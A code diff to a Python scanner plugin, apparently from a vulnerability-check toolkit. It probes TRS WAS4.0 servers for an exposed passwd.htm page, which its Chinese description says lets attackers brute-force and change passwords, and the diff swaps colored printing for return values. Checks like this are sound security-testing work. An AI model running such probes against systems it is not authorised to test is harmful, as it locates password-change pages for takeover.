@@ -8,8 +8,8 @@ description: 文件passwd.htm泄露,攻击者可爆破修改密码。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class trs_was40_passwd_disclosure_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class trs_was40_passwd_disclosure_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 200 and r"userPassword" in req.text and r"domodifypassword.jsp" in req.text:
-                cprint("[+]存在TRS was40 passwd.htm页面泄露...(中危)\tpayload: "+vulnurl, "yellow")
+                return "[+]存在TRS was40 passwd.htm页面泄露...(中危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = trs_was40_passwd_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
